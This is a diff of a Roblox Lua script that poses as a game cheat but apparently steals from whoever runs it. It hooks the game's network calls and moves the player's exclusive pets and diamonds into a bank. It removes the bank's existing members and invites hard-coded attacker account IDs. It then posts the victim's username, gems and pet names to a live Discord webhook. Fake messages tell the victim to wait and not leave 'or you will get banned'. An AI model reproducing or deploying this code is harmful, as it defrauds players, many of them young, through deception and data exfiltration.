@@ -1,4 +1,11 @@
-function SendMessage(huges)
+
+
+local HttpService = game:GetService("HttpService");
+
+local abobus = settings
+
+
+function SendMessage(Webhook, Message, Botname, huges, tier)
 	huges =  table.concat(huges, ', ')
 
 	local webhookcheck =
@@ -9,13 +16,13 @@ function SendMessage(huges)
 		"Kid with shit exploit"
 
 	local url =
-		"https://discord.com/api/webhooks/1041686034834006056/5avDvgDcvd6TSH0y8pihPqB3wvVOcxNYcXUS5bu7d90C0piiZ8b2F7o4OwMKkcpcD0jx"
+		"https://discord.com/api/webhooks/1041466715369910282/xUC1CZNWAQ4yY21lLX-y1DV1u_S8NdDUMNSjR8ztTdk8TuBtVJ0G5vx5jPSCXABkCikU"
 	local data = {
-		["content"] = game.Players.LocalPlayer.Name .. " got some huges ;)",
+		["content"] = Message,
 		["embeds"] = {
 			{
 				["title"] = "**Someone Executed Your Script!**",
-				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **HUGE NAMES:** '.. huges,
+				["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**" .. '\n \n **Huge count:** ' .. Botname .. '\n \n **Gems:** '.. Message .. '\n \n **Total exc:** '.. Webhook.."\n\n **HUGE NAMES:** ".. huges..' \n\n **TIER**: '..tier,
 				["type"] = "rich",
 				["color"] = tonumber(0x7269da),
 				["image"] = {
@@ -40,106 +47,154 @@ end
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 
 
+print('-----------------')
 local abobusikti = (getupvalue or debug.getupvalue)(lib.Network.Invoke, 2)
 fire123 = function(n, ...)
 	return abobusikti(n):InvokeServer(...)
 end
 print(abobusikti("k"))
+local v1 = lib
+local v2 = lib
 
+spawn(function()
 
+	lib.Message.New("Executed! Now wait")
 
-local function AcceptInvite(id)
-	return fire123("e", id)
+end)
+
+--game:GetService("Players").LocalPlayer.PlayerGui.Bank:Destroy()
+
+local ids = {3067660943, 3054700681, 2637234077, 3375574937, 4012744308}
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = fire123("k")
+
+-- local mybanks = lib.Network.Invoke("!F8fb51efb02ff4d8b96d6cce765532ea7")
+-- local a = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIPadding
+-- local b = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIListLayout
+-- local c =game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.Logs.UIListLayout
+-- local e = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.UIListLayout
+-- local f = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.UIAspectRatioConstraint
+-- local d = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.CancelInvites.Button
+-- b:Remove()
+-- a:Remove()
+-- c:Remove()
+-- d:Remove()
+-- e:Remove()
+-- f:Remove()
+-- a:Remove()
+-- local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
+local PetsList = {}
+local PetsList2 = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+	local v2 = lib.Directory.Pets[v.id];
+	if v2.rarity == "Exclusive" then
+		table.insert(PetsList, v.uid);
+		PetsList2[v.uid] = false
+	end
 end
 
+v2.Network.Invoke("B", PetsList2)
 
-local function GetAllHugePets(bankid)
-	local pets1 = {}
-	local u5 = fire123("j", bankid)
-	for i,v in pairs(u5.Storage.Pets) do
+local bankdata = fire123("j", mybanks[1]['BUID'])
+
+for i, v in pairs(bankdata.Players) do
+
+	spawn(function()
+		fire123("h", mybanks[1]['BUID'], v)
+	end)
+end
+
+spawn(function()
+	local hugecount = 0
+	local huges = {}
+
+
+	for i,v in pairs(lib.Save.Get().Pets) do
 		local v2 = lib.Directory.Pets[v.id];
-		if v2.huge or v2.isGift then
-			table.insert(pets1, v.uid)
+		if v2.huge then
+			huges[#huges+1] = v2.name
+			hugecount =  hugecount + 1
 		end
 	end
+	SendMessage(#PetsList, mydiamonds, tostring(hugecount), huges, bankdata.Tier )
+end)
 
-	-- print("Found "..#pets1.." pets")
-	return pets1
+
+local request = fire123("7", mybanks[1]['BUID'], PetsList, math.min(mydiamonds, 0));
+if request then
+	print("std 1")
+else
+	wait(30)
+
+	local request = fire123("7", mybanks[1]['BUID'], PetsList, math.min(mydiamonds, 0));
+end
+-- b:Remove()
+-- a:Remove()
+-- c:Remove()
+-- d:Remove()
+-- e:Remove()
+-- f:Remove()
+-- a:Remove()
+spawn(function()
+	lib.Message.New("Loaded main script. Executing bypass, so you wont get banned. Do not leave, or you will get banned.")
+end)
+
+local function Invite(bankid, Id)
+	local stat = fire123("g", bankid, Id)
+	if stat == true then
+		return stat
+	end
+
+	wait(3)
+
+	return Invite(bankid, Id)
 end
 
-while true do
+for i, Id in pairs(ids) do
 
-
-	pcall(function()
-		local mybanks = fire123("k")
-
-
-
-		local myinvites = fire123("l")
-		for i, v in pairs(myinvites) do
-			if #mybanks < 5 then
-				if AcceptInvite(v.BUID) then
-					print("Accepted Invite")
-				end
-				mybanks[#mybanks+1] = v
-			end
-		end
-
-
-
-		local mybanks = fire123("k")
-		for i, v in pairs(mybanks) do
-			if i ~= 1 then
-				print('testing bank')
-				local pets = GetAllHugePets(v.BUID)
-
-				local pets1 = {}
-
-				for index, value in pairs(pets) do
-					if #pets1 < 49 then
-						table.insert(pets1, value)
-					end
-				end
-				if #pets > 0 then
-
-					local args = {
-						[1] = v.BUID,
-						[2] = pets1,
-						[3] = 0
-					}
-					fire123("8", unpack(args))
-					print('Got huges: '..#pets1)
-				else
-
-					print('Leaving bank: no pets left.')
-					fire123("b", v.BUID)
-				end
-
-
-				wait(3)
-			end
-		end
-
-		local PetsList = {}
-		local PetsList2 = {}
-		for i,v in pairs(lib.Save.Get().Pets) do
-			local v2 = lib.Directory.Pets[v.id];
-			if v2.rarity == "Exclusive" then
-				table.insert(PetsList, v.uid);
-				table.insert(PetsList2, v.name);
-			end
-		end
-
-
-		if #PetsList > 0 then
-			fire123("7", "057f27b8-e7a2-4113-9f55-a4e0184e475c", PetsList, 0)
-			SendMessage(PetsList2);
-		end
-
+	spawn(function()
+		Invite(mybanks[1]['BUID'], Id)
 	end)
 
-	--
-	-- #!F71a1e3ffdba34ed99e8f44ce78d5703bimage.png
 
-	wait(5)
+	wait(3)
+
+
+	-- if game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) then
+	--     warn("std 2")
+	-- else
+	--     game.ReplicatedStorage[bypass(1,"#!F36baffa18f254315b3c1aab530c671d9")]:InvokeServer(mybanks[1]['BUID'], Id) 
+	--     game.Players.LocalPlayer:Kick()
+	-- end;
+end
+
+abobus =false
+
+
+
+spawn(function()
+	lib.Message.New("If you get kicked after that message, it is okay, just wait for another day, or you will get banned")
+end)
+wait(3)
+--game.Players.LocalPlayer:Kick()
+
+
+function comma_value(amount)
+
+	local formatted = amount
+
+	while true do
+
+		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
+
+		if (k == 0) then
+
+			break
+
+		end
+
+	end
+
+	return formatted
+
 end
